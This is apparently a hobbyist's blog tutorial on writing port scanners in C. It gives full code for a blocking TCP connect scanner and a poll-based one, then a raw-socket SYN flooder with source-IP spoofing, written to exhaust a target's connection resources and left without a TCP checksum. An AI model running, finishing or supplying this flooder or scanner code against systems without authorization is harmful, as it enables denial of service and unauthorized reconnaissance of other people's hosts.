## Writing a PortScanner in C

A portscanner is a program that tests the state of a targeted port or range of
ports on a host. There are lots of good portscanners like nmap which are freely
available and support lots of different methods for port and service discovery.
But I thought writing my own would be a fun way to learn about some network
programming techniques. Why do it in C? Well C is fun and in the case of
sockets/networks the relevant headers and code were generally written in C
themselves so it's a great way to dig into what's happening. But feel free to
use whatever you like.

### Simple TCP Connection scanner

The simplest type of portscanner is a TCP connection scanner. For each port in
the range 1 to 65535 (unsigned 16 bit int with 0 reserved as a control port).
We attempt to make a TCP connection to each port in sequence. If the port is
open the connection will succeed with a full [TCP 3-way handshake](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_establishment). If the port is closed
the host should respond to the SYN packet with a RST/ACK packet acknowledging
receipt of the SYN packet and terminating the connection attempt.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define MAXPORT 65535

int main(int argc, char* argv[]){

  if (argc < 2){
    printf("scanner [target-ip]\n");
    exit(1);
  }

  int socket_desc;
  struct sockaddr_in server;

  server.sin_addr.s_addr = inet_addr(argv[1]);
  server.sin_family = AF_INET;

  for(int i=1; i<=MAXPORT; ++i){

    // Initialize socket (ipv4, tcp, )
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_desc == -1){
      printf("error creating socket\n");
      exit(1);
    }

    // Increment port number
    server.sin_port = htons(i);

    // Attempt to connect to the server on port i
    if ( !(connect(socket_desc,
          (struct sockaddr *)&server,
          sizeof(server)) < 0) )
    {
      printf("Connected on: %d\n", i);
    }
    close(socket_desc);
  }

  return 0;
}
```

### Polling TCP Connection Scanner

Our basic TCP connection scanner works pretty well but it has a few problems.
Worst issue is that our main loop with calls to `connect()` is blocking which
seriously limits our scanning speed. We could make a threaded scanner but since
sockets are file descriptors we can use [poll](https://www.man7.org/linux/man-pages/man2/poll.2.html) to open a lot of sockets at once and wait for their return without
blocking or parallelizing each. There seems to be a limit of around 1024
sockets that poll can monitor, so we set a number of ports below that
as our maximum set of ports and call poll on those, stepping through the port numbers
until we finish. The limiter for performance of this scanner seems to be
the timeout for the tcp connection attempt. Filtered ports will send a response
packet to a connection attempt which causes the connection to timeout. Each call
to poll completes when all polled ports are finished which will take the maximum
connection timeout duration if there is a filtered port (there is always a filtered port).
So we could improve this by: tweaking the timeout, updating our polling set
as each socket returns rather than waiting for all to finish.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <poll.h>

#define MAXPORT 65535
#define PORTCHUNK 512
#define SECOND 1000
#define TIMEOUT (1 * SECOND)

int main(int argc, char* argv[]){

  if (argc < 2){
    printf("scanner [target-ip]\n");
    exit(1);
  }

  struct sockaddr_in server, server2;

  // keep checking for ports up until we hit our actual max
  int current_port = 0;
  while(current_port < MAXPORT){

    struct pollfd socket_set[PORTCHUNK];

    // initialize all our sockets
    for(int i=0; i<PORTCHUNK; i++){
      // initialize sockaddr_in
      server.sin_addr.s_addr = inet_addr(argv[1]);
      server.sin_family = AF_INET;
      server.sin_port = htons(i+current_port); // current port up by size

      // initialize socket
      int socket_desc = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
      connect(socket_desc, (struct sockaddr*)&server, sizeof(server));

      // initialize pollfd array with socket
      socket_set[i].fd = socket_desc;
      socket_set[i].events = POLLOUT | POLLERR;
      socket_set[i].revents = 0;
    }

    // poll all of our created sockets until everyone returns
    int remaining_ports = PORTCHUNK;
    while( remaining_ports > 0 ){
      int output = poll(socket_set, PORTCHUNK, TIMEOUT);
      printf("output %d, current_port: %d \n", output, current_port);

      if (output > 0){
        for(int i=0; i<PORTCHUNK; i++){
          // checking for open for output and no error seems to work
          // documentation on the revent return values is a little scarce though
          if( (socket_set[i].revents & POLLOUT) && !(socket_set[i].revents & POLLERR)){
            printf("socket %d - open\n", i+current_port);
          }
        }
      }
      remaining_ports -= output;
    }

    // close all of our our opened sockets
    for(int i=0; i<PORTCHUNK; ++i){
      close(socket_set[i].fd);
    }

    current_port += PORTCHUNK;
  }

  return 0;
}
```

### Raw Socket Scanners

I also wanted to try writing a scanner using raw sockets to learn a little more
about them. Here I ran into some interesting issues with how receiving response
packets are handled for raw socketss. There are a few different scanner types such
as half-open / idle scanners that rely on raw sockets to craft custom tcp packets
and determine the state of the host ports from the responses. However, the socket
interface only sends packets from icmp/igmp and unidentified protocols to raw sockets. TCP/UDP
packets will only be routed to tcp and udp sockets. So if my reading is correct
a scanner sending custom tcp/udp packets on a raw socket cannot receive the replies.
To work around this problem these types of scanners use pcap or other libraries
to read the response packets directly off the network interface. This is a cool
trick but a little beyond what I wanted to bite off. So instead lets write a syn flooder.

### Simple SYN Flooder

SYN flooder is a simple program that sends just the initial SYN packet of the
TCP connection handshake. The server replies with a SYN/ACK (if the port is open)
and importantly leaves the connection open waiting for a response. The idea
of the SYN flooder is to cause a disruption by sending many syn packets and
exhausting resources used to keep open the waiting connections. To do this we
have to bypass the normal TCP stack (which will try to do a full handshake)
and just send the initial SYN packet using a [raw socket](https://en.wikipedia.org/wiki/Network_socket#Types).

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PACKET_LEN 8192
#define SEND_DELAY 1

int main(int argc, char* argv[]){

  if (argc < 5){
    printf("syn_flood [target-ip] [target-port] [source-ip] [source-port]\n");
    exit(1);
  }

  char* target_ip = argv[1];
  char* source_ip = argv[3];
  int target_port = atoi(argv[2]), source_port = atoi(argv[4]);

  printf("starting syn_flood of %s:%d from address %s:%d...\n",
          target_ip, target_port, source_ip, source_port);

  // create a raw socket no type we will write tcp packet ourselves
  int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s < 0){
    printf("error creating socket\n");
    exit(-1);
  }
  else
    printf("socket created successfully\n");

  // Buffer of maximum packet length size to send
  char buffer[PACKET_LEN];
  // Dummy socket address for sendto we manually set address/ports
  struct sockaddr_in socket_addr;

  // IP header and TCP header at appropriate offsets
  struct iphdr *ip = (struct iphdr *) buffer;
  struct tcphdr *tcp = (struct tcphdr *) (buffer + sizeof(struct iphdr));

  // zero out our packet buffer
  memset(buffer, 0, PACKET_LEN);

  // ip header structure
  ip->ihl = 5;  // header length
  ip->version = 4;  // ip version
  ip->tos = 0;  // type of service
  ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr); // total length
  ip->id = htons(54321);  // identification
  ip->frag_off = 0; // fragmentation offset
  ip->ttl = 64; // time to live
  ip->protocol = 6; // TCP protocol
  ip->check = 0; // ip checksum, calculated by kernel
  ip->saddr = inet_addr(source_ip); // source ip
  ip->daddr = inet_addr(target_ip); // destination ip

  // tcp header structure
  tcp->th_sport = htons(source_port);  // source port
  tcp->th_dport = htons(target_port);  // destination port
  tcp->th_seq = htonl(1); // sequence number
  tcp->th_ack = 0;  // acknowledgment number
  tcp->th_off = 5;  // data offset
  tcp->th_flags = TH_SYN; // tcp flags (setting SYN makes this a SYN packet)
  tcp->th_win = htons(32767); // window
  tcp->th_sum = 0;  // tcp checksum
  tcp->th_urp = 0;  // urgent pointer

  while(1){
    if(sendto(s, buffer, ip->tot_len, 0, (struct sockaddr *)&socket_addr, sizeof(socket_addr)) < 0)
    {
      printf("SYN packet send failed...\n");
      exit(-1);
    }
    sleep(SEND_DELAY);
  }

  return 0;
}
```

This is a good example of how powerful raw sockets are. We create the packet to send
as a buffer and use the system headers for ip/tcp to set the appropriate values.
This gives full control over all fields including the ability to spoof source
address and other values that would normally be set by the kernel.

There are a couple things I omitted from this program, it should work for testing
on localhost but creating a fully functional version is left as an exercise for
the reader :). Mainly we did not calculate and set the TCP checksum.

### Useful Resources

[Tenouk tcp/ip tutorial](https://www.tenouk.com/Module42.html)

[Wireshark](https://www.wireshark.org/)

![](http://173.230.154.136/img/blog-entry-7-20.png)